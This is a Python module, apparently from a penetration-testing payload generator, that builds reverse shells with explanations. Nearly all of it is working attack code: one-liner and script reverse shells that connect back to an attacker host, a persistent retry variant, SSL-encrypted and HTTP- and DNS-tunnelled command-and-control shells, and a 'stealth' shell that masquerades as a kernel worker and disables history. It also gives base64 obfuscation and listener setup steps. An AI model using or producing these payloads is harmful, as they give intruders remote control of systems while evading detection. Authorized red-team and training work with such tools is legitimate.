"""
Python Reverse Shell Generator

Generates Python 2 and Python 3 reverse shells with educational explanations.
Python shells are extremely reliable and work on most systems.
"""

from typing import Dict, List
from .base import PayloadGenerator, PayloadConfig, PayloadExplanation


class Python3Generator(PayloadGenerator):
    """
    Generates Python 3 reverse shell payloads
    
    Most reliable and feature-rich reverse shell.
    Works on virtually all Linux systems.
    """
    
    def generate(self) -> str:
        """Generate Python 3 reverse shell"""
        lhost = self.config.lhost
        lport = self.config.lport
        
        # One-liner version (most common)
        payload = (
            f"python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{lhost}\",{lport}));"
            f"os.dup2(s.fileno(),0);"
            f"os.dup2(s.fileno(),1);"
            f"os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/bash\",\"-i\"])'"
        )
        
        return self.post_process(payload)
    
    def generate_full_script(self) -> str:
        """
        Generate full Python script (not one-liner)
        
        Useful for file uploads or when you need a standalone script.
        """
        lhost = self.config.lhost
        lport = self.config.lport
        
        script = f'''#!/usr/bin/env python3
"""
Reverse Shell - For authorized testing only
"""
import socket
import subprocess
import os

def connect():
    """Establish reverse shell connection"""
    try:
        # Create socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Connect to attacker
        s.connect(("{lhost}", {lport}))
        
        # Redirect stdin, stdout, stderr to socket
        os.dup2(s.fileno(), 0)  # stdin
        os.dup2(s.fileno(), 1)  # stdout
        os.dup2(s.fileno(), 2)  # stderr
        
        # Spawn shell
        subprocess.call(["/bin/bash", "-i"])
        
    except Exception as e:
        pass  # Fail silently

if __name__ == "__main__":
    connect()
'''
        return script
    
    def generate_pty_variant(self) -> str:
        """
        Generate PTY (pseudo-terminal) variant
        
        Automatically spawns a proper TTY - no manual upgrade needed!
        """
        lhost = self.config.lhost
        lport = self.config.lport
        
        payload = (
            f"python3 -c 'import socket,subprocess,os,pty;"
            f"s=socket.socket();"
            f"s.connect((\"{lhost}\",{lport}));"
            f"[os.dup2(s.fileno(),fd) for fd in (0,1,2)];"
            f"pty.spawn(\"/bin/bash\")'"
        )
        
        return payload
    
    def generate_persistent_variant(self) -> str:
        """
        Generate variant that keeps retrying connection
        
        Useful for unstable connections or as persistence.
        """
        lhost = self.config.lhost
        lport = self.config.lport
        
        script = f'''#!/usr/bin/env python3
import socket
import subprocess
import os
import time

while True:
    try:
        s = socket.socket()
        s.connect(("{lhost}", {lport}))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/bash", "-i"])
    except:
        time.sleep(60)  # Wait 1 minute before retry
'''
        return script
    
    def explain(self) -> Dict[str, str]:
        """Explain how Python reverse shell works"""
        
        overview = """
Python reverse shell is one of the MOST RELIABLE methods because:
• Python is installed on 95%+ of Linux systems
• Works identically on Python 3.x
• Easy to understand and modify
• Handles binary data properly
• Can spawn proper PTY easily
"""
        
        how_it_works = """
Let's break down the Python reverse shell step by step:

python3 -c 'import socket,subprocess,os;...'
   └─ -c flag: Execute the following Python code

import socket,subprocess,os
   └─ socket: Network communication
   └─ subprocess: Run shell commands
   └─ os: Operating system functions (dup2)

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   └─ Create a TCP socket
   └─ AF_INET: IPv4 address family
   └─ SOCK_STREAM: TCP (reliable, ordered)

s.connect(("10.10.14.5",443))
   └─ Connect to YOUR machine (attacker)
   └─ 10.10.14.5: Your IP (VPN interface)
   └─ 443: Port you're listening on

os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
   └─ Redirect file descriptors to the socket
   └─ 0 = stdin  (what you type)
   └─ 1 = stdout (command output)
   └─ 2 = stderr (error messages)
   └─ Now ALL input/output goes through the network!

subprocess.call(["/bin/bash","-i"])
   └─ Start an interactive bash shell
   └─ -i flag: Interactive mode

RESULT:
The shell runs on the target, but YOU control it from your machine.
Everything is encrypted if you use an SSL wrapper!
"""
        
        requirements = [
            "Python 3 (python3 command available)",
            "Network connectivity",
            "/bin/bash or /bin/sh"
        ]
        
        usage = f"""
STEP 1: Start listener
  nc -lvnp {self.config.lport}

STEP 2: Execute on target
  {self.generate()}

STEP 3 (Optional): Upgrade to full TTY
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  [Ctrl+Z]
  stty raw -echo; fg
  export TERM=xterm

OR use the PTY variant that auto-upgrades:
  {self.generate_pty_variant()}
"""
        
        tips = """
WHY PYTHON OVER BASH:
• More reliable across different systems
• Better error handling
• Works even if bash has restrictions
• Can easily add encryption (SSL)
• Easier to obfuscate

COMMON ISSUES:
• "python3: command not found"
  Solution: Try 'python' or 'python2'
  
• "/bin/bash: No such file"
  Solution: Use "/bin/sh" instead
  
• Connection drops immediately
  Solution: Check firewall, use PTY variant

OBFUSCATION:
  # Base64 encode the payload
  echo '<payload>' | base64 -d | python3
  
  # Or store in file
  echo '<payload>' > /tmp/.system
  python3 /tmp/.system
"""
        
        return PayloadExplanation.format_explanation(
            overview=overview.strip(),
            how_it_works=how_it_works.strip(),
            requirements=requirements,
            usage=usage.strip(),
            tips=tips.strip()
        )
    
    def test_requirements(self) -> List[str]:
        return ['python3']
    
    def obfuscate_simple(self, payload: str) -> str:
        """
        Obfuscate Python payload using string manipulation
        """
        import base64
        
        # Extract the Python code (between quotes)
        if "python3 -c '" in payload:
            start = payload.index("'") + 1
            end = payload.rindex("'")
            python_code = payload[start:end]
            
            # Base64 encode
            encoded = base64.b64encode(python_code.encode()).decode()
            
            # Create obfuscated command
            obfuscated = f"python3 -c 'import base64;exec(base64.b64decode(\"{encoded}\").decode())'"
            return obfuscated
        
        return payload


class Python2Generator(PayloadGenerator):
    """
    Generates Python 2 reverse shells
    
    For older systems still running Python 2.
    Syntax is slightly different from Python 3.
    """
    
    def generate(self) -> str:
        """Generate Python 2 reverse shell"""
        lhost = self.config.lhost
        lport = self.config.lport
        
        payload = (
            f"python -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{lhost}\",{lport}));"
            f"os.dup2(s.fileno(),0);"
            f"os.dup2(s.fileno(),1);"
            f"os.dup2(s.fileno(),2);"
            f"p=subprocess.call([\"/bin/sh\",\"-i\"])'"
        )
        
        return self.post_process(payload)
    
    def explain(self) -> Dict[str, str]:
        """Explain Python 2 shell"""
        overview = """
Python 2 reverse shell is nearly identical to Python 3.
Main difference: 'python' command instead of 'python3'.

Python 2 reached end-of-life in 2020, but many older systems
still have it installed.
"""
        
        how_it_works = """
Same as Python 3, but uses:
• 'python' command (not 'python3')
• Slightly different syntax in some areas
• May use /bin/sh instead of /bin/bash (more compatible)
"""
        
        requirements = ["Python 2.x", "/bin/sh or /bin/bash"]
        
        usage = f"""
USAGE:
  1. nc -lvnp {self.config.lport}
  2. {self.generate()}
"""
        
        return PayloadExplanation.format_explanation(
            overview=overview.strip(),
            how_it_works=how_it_works.strip(),
            requirements=requirements,
            usage=usage.strip()
        )
    
    def test_requirements(self) -> List[str]:
        return ['python', 'python2']


class PythonAdvancedGenerator(Python3Generator):
    """
    Advanced Python shells with extra features
    
    Includes:
    - SSL/TLS encryption
    - Auto-reconnect
    - Stealth features
    """
    
    def generate_ssl_shell(self) -> str:
        """
        Generate SSL-encrypted reverse shell
        
        Encrypts all traffic - harder to detect by IDS/IPS
        """
        lhost = self.config.lhost
        lport = self.config.lport
        
        script = f'''#!/usr/bin/env python3
import socket
import subprocess
import os
import ssl

# Create SSL context (no cert verification for simplicity)
context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

# Connect
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s = context.wrap_socket(s, server_hostname="{lhost}")
s.connect(("{lhost}", {lport}))

# Redirect I/O
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# Spawn shell
subprocess.call(["/bin/bash", "-i"])
'''
        return script
    
    def generate_stealth_shell(self) -> str:
        """
        Generate stealth shell that hides its presence
        
        Features:
        - Process name masquerading
        - No .bash_history
        - Minimal footprint
        """
        lhost = self.config.lhost
        lport = self.config.lport
        
        script = f'''#!/usr/bin/env python3
import socket
import subprocess
import os
import sys

# Masquerade as system process
sys.argv[0] = '[kworker/0:0]'

# Disable history
os.environ['HISTFILE'] = '/dev/null'
os.environ['HISTSIZE'] = '0'

# Connect
s = socket.socket()
s.connect(("{lhost}", {lport}))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

subprocess.call(["/bin/bash", "-i"])
'''
        return script
    
    def generate_http_tunnel(self) -> str:
        """
        Generate HTTP-tunneled shell
        
        Uses HTTP requests - looks like web traffic
        Great for bypassing strict firewalls
        """
        lhost = self.config.lhost
        lport = self.config.lport
        
        script = f'''#!/usr/bin/env python3
import requests
import subprocess
import time
import base64

url = "http://{lhost}:{lport}"
session = requests.Session()

while True:
    try:
        # Get command from server
        r = session.get(f"{{url}}/cmd")
        cmd = r.text
        
        if cmd:
            # Execute command
            output = subprocess.check_output(
                cmd, 
                shell=True, 
                stderr=subprocess.STDOUT
            )
            
            # Send output back
            session.post(
                f"{{url}}/output",
                data={{"output": base64.b64encode(output).decode()}}
            )
        
        time.sleep(1)
    except:
        time.sleep(5)
'''
        return script
    
    def generate_dns_tunnel(self) -> str:
        """
        Generate DNS-tunneled shell
        
        Uses DNS queries - works even with strict firewalls
        """
        lhost = self.config.lhost
        
        script = f'''#!/usr/bin/env python3
# DNS Tunnel Shell - Bypasses most firewalls
# Requires: DNS server on attacker side

import socket
import subprocess
import base64
import time

def dns_query(data):
    """Send data via DNS query"""
    # Encode data as subdomain
    encoded = base64.b32encode(data.encode()).decode().lower()
    query = f"{{encoded}}.tunnel.{lhost}"
    
    try:
        # DNS query carries our data
        socket.gethostbyname(query)
    except:
        pass

def get_command():
    """Receive command via DNS TXT record"""
    try:
        # Query TXT record for commands
        import dns.resolver
        answers = dns.resolver.resolve(f"cmd.tunnel.{lhost}", 'TXT')
        return str(answers[0]).strip('"')
    except:
        return ""

# Main loop
while True:
    cmd = get_command()
    if cmd:
        output = subprocess.check_output(cmd, shell=True)
        dns_query(output.decode()[:100])  # Send in chunks
    time.sleep(5)
'''
        return script
    
    def explain_advanced_features(self) -> str:
        """Explain advanced shell features"""
        
        explanation = """
🔒 SSL ENCRYPTED SHELL:
  Encrypts all traffic between you and target.
  
  Benefits:
  • IDS/IPS can't see commands
  • Looks like HTTPS traffic
  • Harder to detect
  
  Setup:
  1. On attacker: socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0 -
  2. Run SSL shell on target
  
🥷 STEALTH SHELL:
  Hides its presence on the system.
  
  Features:
  • Process name masquerading
  • No command history
  • Minimal log footprint
  
  Good for:
  • Red team engagements
  • Avoiding detection
  
🌐 HTTP TUNNEL:
  Shell over HTTP requests.
  
  Benefits:
  • Looks like web browsing
  • Works through HTTP proxies
  • Bypasses restrictive firewalls
  
  Requires:
  • HTTP server on attacker side
  • More complex setup
  
🔍 DNS TUNNEL:
  Shell over DNS queries.
  
  Benefits:
  • Works when ONLY DNS allowed
  • Extremely stealthy
  • Bypasses almost all firewalls
  
  Drawbacks:
  • Very slow
  • Complex setup
  • Requires DNS server
  
  Use case: Corporate networks that only allow DNS
"""
        return explanation


# Utility functions
def detect_python_version(target_output: str) -> str:
    """
    Detect Python version on target from command output
    
    Args:
        target_output: Output from 'python --version' or similar
        
    Returns:
        'python3', 'python2', or 'python' (unknown version)
    """
    output_lower = target_output.lower()
    
    if 'python 3' in output_lower:
        return 'python3'
    elif 'python 2' in output_lower:
        return 'python2'
    else:
        return 'python'


def auto_select_python_payload(
    has_python3: bool,
    has_python2: bool,
    config: PayloadConfig
) -> PayloadGenerator:
    """
    Automatically select best Python payload based on available versions
    
    Args:
        has_python3: Whether python3 is available
        has_python2: Whether python2 is available
        config: PayloadConfig instance
        
    Returns:
        Appropriate Python generator
    """
    if has_python3:
        return Python3Generator(config)
    elif has_python2:
        return Python2Generator(config)
    else:
        # Default to python3 and hope for the best
        return Python3Generator(config)
